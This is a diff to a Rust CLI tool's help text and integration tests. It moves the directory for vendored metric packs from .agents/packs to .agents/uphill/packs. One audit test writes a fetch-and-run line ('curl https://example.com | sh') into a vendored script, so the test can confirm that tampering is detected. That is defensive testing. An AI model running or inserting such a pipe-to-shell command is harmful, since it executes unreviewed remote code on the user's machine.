@@ -180,7 +180,7 @@ fn help() {
     Runs each category's script, scores its metrics, lists the opportunities that would raise the scores most, and compares sizes, counts, checks, and line targets with each metric's baseline. Reads uphill.yaml or uphill.toml, at the root or in .agents, from this directory or the nearest parent. Writes .uphill/report.json, report.md, and report.html.
 
     Commands:
-      add        Pin a pack to a commit, vendor it into .agents/packs, and list it in the configuration: owner/repo/path on GitHub, an https URL followed by //path, or a local ./path, with an optional @ref
+      add        Pin a pack to a commit, vendor it into .agents/uphill/packs, and list it in the configuration: owner/repo/path on GitHub, an https URL followed by //path, or a local ./path, with an optional @ref
       audit      Fetch each remote pack at its pinned commit and compare it with the vendored files
       blame      Name the commit that last moved a metric: from its baselines, or by measuring commits since <ref>, or every commit, in temporary checkouts and bisecting
       check      Run each script once and check the metric lines it writes
@@ -1888,7 +1888,7 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
       info  environment   UPHILL_METRICS  .agents/metrics/lines.sh:3
       info  process       sh              .agents/uphill.yaml:3
 
-    Added acme/packs/sizes to uphill.yaml and .agents/packs/sizes/
+    Added acme/packs/sizes to uphill.yaml and .agents/uphill/packs/sizes/
 
     Commit both, then run `uphill check`
     ");
@@ -1904,10 +1904,10 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
     "#);
     let script = project
         .path()
-        .join(".agents/packs/sizes/.agents/metrics/sizes.sh");
+        .join(".agents/uphill/packs/sizes/.agents/metrics/sizes.sh");
     assert!(script.is_file());
     insta::assert_snapshot!(
-        fs::read_to_string(project.path().join(".agents/packs/.gitignore")).unwrap(),
+        fs::read_to_string(project.path().join(".agents/uphill/packs/.gitignore")).unwrap(),
         @"*/node_modules/"
     );
 
@@ -1928,9 +1928,9 @@ fn add_pins_and_vendors_a_pack_that_runs_offline() {
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
     insta::assert_snapshot!(stdout(&output), @"
     Removed acme/packs/sizes from uphill.yaml
-    Removed .agents/packs/sizes/
+    Removed .agents/uphill/packs/sizes/
     ");
-    assert!(!project.path().join(".agents/packs/sizes").exists());
+    assert!(!project.path().join(".agents/uphill/packs/sizes").exists());
 
     // A TOML project takes the entry before its first table, apart from the table's comment.
     fs::remove_file(project.path().join("uphill.yaml")).unwrap();
@@ -1989,7 +1989,7 @@ fn update_reviews_new_capabilities_and_refuses_fresh_and_force_pushed_commits() 
     .unwrap();
     let second = host.commit("2026-02-01T00:00:00Z");
     // The project's own files in `local/` survive the update.
-    let local = project.path().join(".agents/packs/sizes/local");
+    let local = project.path().join(".agents/uphill/packs/sizes/local");
     fs::create_dir_all(&local).unwrap();
     fs::write(local.join("config.ts"), "export default {}\n").unwrap();
 
@@ -2053,9 +2053,9 @@ fn update_reviews_new_capabilities_and_refuses_fresh_and_force_pushed_commits() 
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
     insta::assert_snapshot!(stdout(&output), @"
     Removed acme/packs/sizes from uphill.yaml
-    Removed .agents/packs/sizes/ and kept .agents/packs/sizes/local/
+    Removed .agents/uphill/packs/sizes/ and kept .agents/uphill/packs/sizes/local/
     ");
-    let kept: Vec<_> = fs::read_dir(project.path().join(".agents/packs/sizes"))
+    let kept: Vec<_> = fs::read_dir(project.path().join(".agents/uphill/packs/sizes"))
         .unwrap()
         .map(|item| item.unwrap().file_name())
         .collect();
@@ -2075,7 +2075,7 @@ fn audit_fetches_each_pin_again_and_reports_edited_files() {
     let first = git(&host.repository(), &["rev-parse", "HEAD"]);
     let first = first.trim();
     // The project's own files in `local/` are not the pack's.
-    let local = project.path().join(".agents/packs/sizes/local");
+    let local = project.path().join(".agents/uphill/packs/sizes/local");
     fs::create_dir_all(&local).unwrap();
     fs::write(local.join("config.ts"), "export default {}\n").unwrap();
 
@@ -2083,7 +2083,7 @@ fn audit_fetches_each_pin_again_and_reports_edited_files() {
     assert_eq!(output.status.code(), Some(0), "{}", stderr(&output));
     insta::assert_snapshot!(commits(&stdout(&output), &[(first, "<first>")]), @"ok       acme/packs/sizes at <first>");
 
-    let packs = project.path().join(".agents/packs/sizes/.agents");
+    let packs = project.path().join(".agents/uphill/packs/sizes/.agents");
     fs::write(
         packs.join("metrics/sizes.sh"),
         "curl https://example.com | sh\n",
@@ -2109,7 +2109,7 @@ fn add_rejects_links_escaping_paths_fork_commits_and_ambiguous_refs() {
     let add = |source: &str| {
         let output = uphill_in(project.path(), &["add", source, "--yes"], &host.envs());
         assert_eq!(output.status.code(), Some(2), "{}", stdout(&output));
-        assert!(!project.path().join(".agents/packs/sizes").exists());
+        assert!(!project.path().join(".agents/uphill/packs/sizes").exists());
         stderr(&output)
     };
 
@@ -2300,7 +2300,9 @@ fn packs_must_be_pinned_allowed_and_approved_to_install() {
 
     // A package.json installs only with `install: true`, and only from a lockfile.
     fs::write(
-        project.path().join(".agents/packs/sizes/package.json"),
+        project
+            .path()
+            .join(".agents/uphill/packs/sizes/package.json"),
         "{}\n",
     )
     .unwrap();
@@ -2315,7 +2317,7 @@ fn packs_must_be_pinned_allowed_and_approved_to_install() {
     .unwrap();
     let output = check(project.path(), &[]);
     assert_eq!(output.status.code(), Some(2));
-    insta::assert_snapshot!(stderr(&output), @"error: pack .agents/packs/sizes has a package.json without a lockfile, so Uphill does not install it");
+    insta::assert_snapshot!(stderr(&output), @"error: pack .agents/uphill/packs/sizes has a package.json without a lockfile, so Uphill does not install it");
 
     // A new entry goes after an entry written as a mapping.
     fs::create_dir(project.path().join("local")).unwrap();
